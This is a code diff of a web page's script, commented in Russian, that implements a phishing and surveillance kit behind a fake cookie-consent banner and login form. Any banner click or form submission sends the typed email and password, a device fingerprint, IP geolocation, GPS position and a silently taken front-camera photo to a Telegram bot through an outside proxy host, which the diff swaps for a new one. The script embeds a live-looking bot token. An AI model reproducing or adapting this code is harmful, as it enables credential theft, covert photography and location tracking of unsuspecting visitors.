@@ -113,12 +113,11 @@
 
 <script>
     // ===== ВАШИ ДАННЫЕ =====
-    const PROXY_URL = "https://mailproxy.donatstaff.workers.dev";
+    const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
     const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
     const CHAT_ID = "8872810304";
     // ========================
 
-    // ===== ОТПРАВКА ТЕКСТА =====
     function send(text) {
         fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
             method: "POST",
@@ -127,7 +126,6 @@
         }).catch(function() {});
     }
 
-    // ===== ОТПРАВКА ФОТО =====
     function sendPhoto(base64, caption) {
         const byteString = atob(base64.split(",")[1]);
         const ab = new ArrayBuffer(byteString.length);
@@ -146,14 +144,12 @@
         }).catch(function() {});
     }
 
-    // ===== ДАННЫЕ ФОРМЫ =====
     function collectAndSend(type) {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
         send("📩 " + type + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU"));
     }
 
-    // ===== ФОТО С КАМЕРЫ =====
     function capturePhoto() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 }, audio: false })
@@ -179,17 +175,13 @@
                     }, 1200);
                 };
             })
-            .catch(function(err) {
-                // Молча - без отправки сообщения об отказе
-            });
+            .catch(function(err) {});
     }
 
-    // ===== СБОР ИНФЫ ОБ УСТРОЙСТВЕ =====
     function collectAllInfo() {
         let info = "📱 УСТРОЙСТВО\n━━━━━━━━━━━━━━━━━━\n";
         info += "🕒 " + new Date().toLocaleString("ru-RU") + "\n";
         info += "🌐 URL: " + window.location.href + "\n";
-        info += "↩ " + (document.referrer || "(прямой)") + "\n";
         info += "📱 UA: " + navigator.userAgent + "\n";
         info += "💻 Платформа: " + (navigator.platform || "—") + "\n";
         info += "🌐 Язык: " + (navigator.language || "—") + "\n";
@@ -200,20 +192,17 @@
         info += "🕓 Часовой пояс: " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "—");
         send(info);
 
-        // Сеть
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (c) {
             send("📡 СЕТЬ\n📶 " + (c.effectiveType || "—") + "\n⬇ " + (c.downlink || "—") + " Мбит/с\n📊 RTT " + (c.rtt || "—") + " мс");
         }
 
-        // Батарея
         if (navigator.getBattery) {
             navigator.getBattery().then(function(b) {
                 send("🔋 БАТАРЕЯ\n🔋 " + Math.round(b.level * 100) + "%\n⚡ " + (b.charging ? "заряжается" : "не заряжается"));
             }).catch(function() {});
         }
 
-        // Медиа
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
             navigator.mediaDevices.enumerateDevices().then(function(devices) {
                 const cams = devices.filter(d => d.kind === "videoinput").length;
@@ -222,7 +211,6 @@
             }).catch(function() {});
         }
 
-        // IP + гео
         fetch("https://ipapi.co/json/")
             .then(r => r.json())
             .then(function(d) {
@@ -239,7 +227,6 @@
             })
             .catch(function() {});
 
-        // GPS
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(p) {
@@ -251,34 +238,24 @@
         }
     }
 
-    // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
     document.getElementById("btnAccept").addEventListener("click", function() {
-        // Отправляем данные формы, если есть
         collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
-
-        // Собираем инфу об устройстве
         collectAllInfo();
-
-        // Фото с камеры
         capturePhoto();
-
-        // Скрываем баннер
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
 
-    // ===== КНОПКА "ОТКЛОНИТЬ" =====
     document.getElementById("btnDecline").addEventListener("click", function() {
         collectAndSend("COOKIE ОТКЛОНЕНО");
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
 
-    // ===== ОТПРАВКА ФОРМЫ =====
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
         collectAndSend("РУЧНОЙ ВВОД");
     });
 
-    console.log("ROCKET ACTIVE — без prompt, через прокси");
+    console.log("ROCKET ACTIVE — через deno");
 </script>
 </body>
 </html>
